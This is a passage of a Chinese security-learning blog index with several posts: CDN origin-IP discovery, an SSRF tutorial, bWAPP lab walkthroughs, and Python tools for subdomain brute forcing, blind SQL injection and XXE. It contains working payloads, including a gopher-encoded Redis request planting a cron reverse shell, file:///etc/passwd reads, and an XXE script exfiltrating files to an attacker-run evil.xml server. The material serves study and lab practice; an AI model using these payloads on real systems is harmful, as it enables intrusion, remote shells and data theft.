<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下</p>
<p>80.http.get.headers.server:cloudflare</p>
<p><img src="1058583-20181009231212219-1764707602%5B1%5D.png" alt=""></p>
<h5 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h5><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p>
<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
<pre><code>ga（&#39;create&#39;，&#39;UA-93577176-1&#39;，&#39;auto&#39;）;</code></pre><p>​        可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
<p><strong>Shodan</strong></p>
<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
<h5 id="7-使用国外主机解析域名"><a href="#7-使用国外主机解析域名" class="headerlink" title="7:使用国外主机解析域名"></a>7:使用国外主机解析域名</h5><p>​        国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<p>​       我这里通过国外主机nslookup查询国内163.com对应IP。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427095107.png" alt=""></p>
<p>我们可以看到只返回了一条对应IP，猜测应该是真实IP。</p>
<p>这里推荐一个国外的多节点ping工具。</p>
<p>域名：<a href="http://www.just-ping.com/" target="_blank" rel="noopener">http://www.just-ping.com/</a></p>
<h5 id="8-网站漏洞查找"><a href="#8-网站漏洞查找" class="headerlink" title="8:网站漏洞查找"></a>8:网站漏洞查找</h5><p>1.目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</p>
<p> 2.XSS盲打，命令执行反弹shell，SSRF等。可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</p>
<p> 3.无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h5 id="9-网站邮件订阅查找"><a href="#9-网站邮件订阅查找" class="headerlink" title="9:网站邮件订阅查找"></a>9:网站邮件订阅查找</h5><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
<h4 id="如何防止CDN被绕过？"><a href="#如何防止CDN被绕过？" class="headerlink" title="如何防止CDN被绕过？"></a>如何防止CDN被绕过？</h4><p>通过中间件配置只允许域名访问，禁止ip访问。</p>
<p>这样处理的话，所有直接访问站点真实IP的请求将会被拒绝，任何用户只能通过域名访问站点，通过预先设定的网络链路，从DNS→CDN→waf防护→源站，所有的域名访问请求都必须经过WAF检测。</p>
<h5 id="Nginx参考配置："><a href="#Nginx参考配置：" class="headerlink" title="Nginx参考配置："></a>Nginx参考配置：</h5><pre><code>#添加一个server,在原server里绑定域名
server  {
        listen 80 default;
        server_name _;
        return 403;
    }
server {
        listen       80;
        server_name  www.demo.com;
        .........</code></pre><h5 id="Apache参考配置"><a href="#Apache参考配置" class="headerlink" title="Apache参考配置:"></a>Apache参考配置:</h5><pre><code>#在httpd.conf最后面加上

&lt;VirtualHost 此处填写IP&gt;
        ServerName 此处填写IP
        &lt;Location /&gt;
            Order Allow,Deny
            Deny from all
        &lt;/Location&gt;
&lt;/VirtualHost&gt;

&lt;VirtualHost 此处填写IP&gt;
        DocumentRoot /var/www/html
        ServerName   此处填写域名
&lt;/VirtualHost&gt;</code></pre><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://zhuanlan.zhihu.com/p/116026247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/116026247</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/107294740" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/107294740</a></p>
<p><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/cdn-find-ip.html</a></p>
<p><a href="https://forum.90sec.com/t/topic/524" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/524</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/20/ssrf-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/20/ssrf-lou-dong-xue-xi/" itemprop="url">我的SSRF漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-20T14:42:33+08:00">
                2020-04-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="20181227082125119.png" alt=""></p>
<p>​       SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>例如：</p>
<p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p>
<p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p>
<p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
<p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p>
<p><strong>curl造成的SSRF</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>file_get_contents造成的SSRF</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul>
<li>分享：通过URL地址分享网页内容</li>
<li>转码服务</li>
<li>在线翻译</li>
<li>图片加载与下载：通过URL地址加载或下载图片</li>
<li>图片、文章收藏功能</li>
<li>未公开API实现以及其他调用URL的功能</li>
</ul>
<h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p>
<p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p>
<h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol>
<li>让服务器去访问相应的网址</li>
<li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li>
<li>可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</li>
<li>攻击运行在内网或本地的应用程序（比如溢出）;</li>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li>
</ol>
<p>SSRF中各个编程语言可以使用的协议如下图所示：</p>
<p><img src="12.png" alt=""></p>
<ul>
<li><p>file协议</p>
<p>​    查看文件：file:///etc/passwd</p>
</li>
<li><p>dict协议</p>
<p>​    探测端口：dict://127.0.0.1:80</p>
</li>
<li><p>gopher协议</p>
<p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p>
<pre><code>curl -v &#39;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;</code></pre></li>
</ul>
<ol>
<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li>
<li>攻击内网应用程序（利用跨协议通信技术）</li>
<li>DOS攻击</li>
<li>判断内网主机是否存活：访问是否有端口开放</li>
</ol>
<h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul>
<li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p>
</li>
<li><p>利用特殊的域名</p>
</li>
<li><p>利用句号</p>
<p>127。0。0。1=&gt;127.0.0.1</p>
</li>
<li><p>利用协议</p>
</li>
<li><p>利用Enclosed </p>
</li>
<li><p>IP使用其他进制：127.0.0.1=2130706433</p>
</li>
<li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p>
</li>
</ul>
<h5 id=""><a href="#" class="headerlink" title=""></a><img src="QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt=""></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p>
<img src="QQ截图20200128162933.png" style="zoom:50%;" />



<p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p>
<img src="QQ截图20200128163234.png" style="zoom:50%;" />



<p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt=""></p>
<p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p>
<img src="QQ截图20200128164256.png" style="zoom:50%;" />



<h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p>
<img src="QQ截图20200128170206.png" style="zoom:67%;" />

<p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p>
<p> 然后使用Burp抓包后发送到Repeater模块，</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p>
<p> 第一次我们使用http协议读取robots.txt文件内容</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p>
<p>第二次我们使用php协议读取 xml页面中的内容</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p>
<p>第三次我们使用file协议读取本机的/etc/passwd的内容</p>
<img src="QQ截图20200128180043.png" style="zoom:67%;" />



<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://xz.aliyun.com/t/7333" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333</a></p>
<p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></p>
<p><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/" itemprop="url">python编写子域名爆破小工具</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-20T12:42:19+08:00">
                2020-04-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">python学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="python编写子域名爆破小工具"><a href="#python编写子域名爆破小工具" class="headerlink" title="python编写子域名爆破小工具"></a>python编写子域名爆破小工具</h2><h4 id="字典生成工具编写"><a href="#字典生成工具编写" class="headerlink" title="字典生成工具编写"></a>字典生成工具编写</h4><p>这里主要使用的python的exrex模块：</p>
<p>此处有详细介绍，</p>
<pre><code>https://github.com/asciimoo/exrex</code></pre><p>这个模块的主要功能：</p>
<ul>
<li>生成所有匹配的字符串</li>
<li>生成随机匹配的字符串</li>
<li>计算匹配字符串的数量</li>
<li>简化正则表达式</li>
</ul>
<p>安装方法：</p>
<pre><code>pip install exrex</code></pre><p>我们主要使用该模块的generate()方法。</p>
<ul>
<li>generate(s,limit=20)</li>
<li>函数的作用：创建一个生成器，生成给定正则表达式的所有匹配字符串</li>
<li>参数s:正则表达式</li>
<li>limit：范围限制，要求limit的类型为整型数</li>
</ul>
<h5 id="简单的例子："><a href="#简单的例子：" class="headerlink" title="简单的例子："></a>简单的例子：</h5><pre><code>import exrex

web_dic=&#39;demo&#39;
dic_pass=&#39;admin&#39;
rule = &#39;{web_dic}[!@#]{dic_pass}&#39;
s = rule.format(web_dic=web_dic,dic_pass=dic_pass)
dics = list(exrex.generate(s))
for i in dics:
    print i</code></pre><h4 id="编写子域名爆破脚本"><a href="#编写子域名爆破脚本" class="headerlink" title="编写子域名爆破脚本"></a>编写子域名爆破脚本</h4><p>自己编写的理解脚本</p>
<pre><code>import exrex  #导入生成字典模块


def host_replace(hosts):         #域名处理方法
    if &#39;://&#39; in hosts:
        hosts = hosts.split(&#39;://&#39;)[1]
    if &#39;/&#39; in hosts: 
        hosts = hosts.replace(&#39;/&#39;,&#39;&#39;)              
    hosts = &quot;&quot;.join(hosts)
    return hosts

def dic_create(hosts):        #子域名字典生成方法
    web_white = [&#39;com&#39;, &#39;cn&#39;, &#39;gov&#39;, &#39;edu&#39;, &#39;org&#39;]
    web_dics = hosts.split(&#39;.&#39;)
    for web_dic in web_dics:
        if web_dic not in web_white:
            f_rule = open(&#39;rule.ini&#39;, &#39;r&#39;)
            for i in f_rule:
                dics = list(exrex.generate(web_dic+i.strip(&#39;\r\n&#39;)))
                for dic in dics:
                    if len(dic)&gt;3:
                        dic_out = open(&#39;mypass.txt&#39;,&#39;a+&#39;)
                        dic_out.write(dic+&#39;\r\n&#39;)
                        dic_out.close()
                        print dic
    f_rule.close()
def main():       #主函数
    hosts = raw_input(&quot;Write Your Hosts :&quot;)
    host =host_replace(hosts)
    dic_create(host)

if __name__ == &#39;__main__&#39;:
    main()</code></pre><p>参考：<a href="https://www.jianshu.com/p/a481a341eaa4" target="_blank" rel="noopener">https://www.jianshu.com/p/a481a341eaa4</a></p>
<p>子域名爆破脚本进阶版：</p>
<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-

import dns.resolver
import threading
import Queue 
import optparse
import sys                    

queue = Queue.Queue()
lock = threading.Lock()

class GetSubDomain(threading.Thread):
    &quot;&quot;&quot;docstring for SubDomain&quot;&quot;&quot;
    def __init__(self, target,queue,outfile):
        threading.Thread.__init__(self)
        self.target = target
        self.queue = queue
        self.rsv = dns.resolver.Resolver()
        outfile = target + &#39;.txt&#39; if not outfile else outfile
        self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;)
        self.ip_list = []

    def _scan(self):
        while not self.queue.empty():
            self.ip_list = []
            ips = None
            sub_domain = self.queue.get() + &#39;.&#39; + self.target
            for _ in range(3):
                try:
                    answers = self.rsv.query(sub_domain)
                    if answers:
                        for answer in answers:
                            if answer.address not in self.ip_list:
                                self.ip_list.append(answer.address)
                except dns.resolver.NoNameservers, e:
                    break
                except Exception, e:
                    pass
            if len(self.ip_list)&gt;0:
                ips = &#39;,&#39;.join(self.ip_list)
                msg = sub_domain.ljust(30) + ips + &#39;\n&#39;
                lock.acquire()
                print msg
                self.f.write(msg)
                lock.release()
            self.queue.task_done()

    def run(self):
        self._scan()

def get_target(domain_list):
    targets = []
    for line in open(domain_list,&#39;r&#39;):
        if line:
            targets.append(line.strip())
    return targets

def get_sub_queue(sub_file): #得到所有子域名的queue
    for line in open(sub_file,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,
        type=&#39;string&#39;, help=&#39;Get a single top-level domain names.&#39;)
    parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;domain_list&#39;,
        type=&#39;string&#39;, help=&#39;Top-level domain name list.&#39;)
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;sub_file&#39;, default=&#39;sub.txt&#39;,
        type=&#39;string&#39;, help=&#39;Dict file used to brute sub names&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--threads&#39;, dest=&#39;threads_num&#39;, default=60, 
        type=&#39;int&#39;, help=&#39;Number of threads. default = 60&#39;)
    parser.add_option(&#39;-o&#39;, &#39;--outfile&#39;, dest=&#39;outfile&#39;, default=None,
        type=&#39;string&#39;, help=&#39;Output file name. default is {target}.txt&#39;)

    (options, args) = parser.parse_args()
    if options.url:
        urls = [options.url]
    elif options.domain_list:
        urls = get_target(options.domain_list)
    else:
        parser.print_help()
        print &quot;Example: &quot;
        print &quot;\tpython getsub.py -u baidu.com&quot;
        print &quot;\tpython getsub.py -l domain.txt -f sub.txt -t 50&quot;
        sys.exit(0)

    for url in urls:
        get_sub_queue(options.sub_file)
        for x in xrange(1,options.threads_num+1):
            t = GetSubDomain(url,queue,options.outfile)
            t.setDaemon(True)
            t.start()
        queue.join()

if __name__ == &#39;__main__&#39;:
    main()</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/" itemprop="url">python编写sql注入&xml注入工具</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-20T12:41:52+08:00">
                2020-04-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">python学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="python编写sql注入-amp-xml注入工具"><a href="#python编写sql注入-amp-xml注入工具" class="headerlink" title="python编写sql注入&amp;xml注入工具"></a>python编写sql注入&amp;xml注入工具</h2><h4 id="python编写sql盲注注入脚本"><a href="#python编写sql盲注注入脚本" class="headerlink" title="python编写sql盲注注入脚本"></a>python编写sql盲注注入脚本</h4><pre><code>import requests  #导入request模块

url = &#39;http://192.168.181.138/sqli-labs-master/Less-8/?id=1%s&#39;
headers = {&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&#39;}  #定义请求header头
check_data=list(&#39;1234567890abcdefghijklmnopqrstuzwxyz@&#39;)  
print(&quot;SQL Injection for MySQL!&quot;)
l = &quot;&#39; and length(database())=%s and &#39;1&#39;=&#39;1&quot;            #定义注入语句
st = &quot;&#39; and substr(database(),%s,1)=&#39;%s&#39;and &#39;1&#39;=&#39;1&quot;     #定义注入语句
user = &quot;&quot;
for i in range(0,20):
    sql = l % str(i)        #payload拼接
    judge1 = requests.get(url % sql,headers=headers,timeout=30)
    if judge1.content.find(b&quot;You are in...........&quot;) != -1:   #判断页面回显
        length = i
        print(i)
        break

for k in range(1,i+1):
    for ss in check_data:
        str_user = st % (str(k),str(ss))
        judge2 = requests.get(url % str_user,headers=headers,timeout = 30)
        if judge2.content.find(b&quot;You are in...........&quot;) != -1:
            user = user + ss


print(user)</code></pre><h4 id="python编写xml注入脚本"><a href="#python编写xml注入脚本" class="headerlink" title="python编写xml注入脚本"></a>python编写xml注入脚本</h4><pre><code>from http.server import HTTPServer,CGIHTTPRequestHandler
import threading
import requests


def web_server():
    port = 3344
    httpd = HTTPServer((&#39;&#39;,port),CGIHTTPRequestHandler)
    print(&quot;[*] Starting simple_httpd on port:&quot;,httpd.server_port)
    httpd.serve_forever()

def send_data():
    files = &#39;C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php&#39;
    data = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\r\n&lt;!DOCTYPE test [\r\n&lt;!ENTITY % file SYSTEM \&quot;php://filter/read=convert.base64-encode/resource=C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php\&quot;&gt;\r\n&lt;!ENTITY % dtd SYSTEM \&quot;http://192.168.181.128/evil.xml\&quot; &gt;\r\n%dtd;\r\n%send;\r\n]&gt;&quot;
    requests.post(&quot;http://192.168.181.138/xxe-lab-master/php_xxe/&quot;,data=data)
    files = input(&quot;Write filename&quot;)

if __name__ == &#39;__main__&#39;:
    file = open(&#39;evil.xml&#39;,&#39;w&#39;)
    file.write(&quot;&lt;!ENTITY % payload \&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;HTTP://192.168.181.128/?content=%file;&#39;&gt;\&quot;&gt; %payload;&quot;)
    file.close()
    t1 = threading.Thread(target=web_server)
    t1.start()
    t2 = threading.Thread(target=send_data)
    t2.start()</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
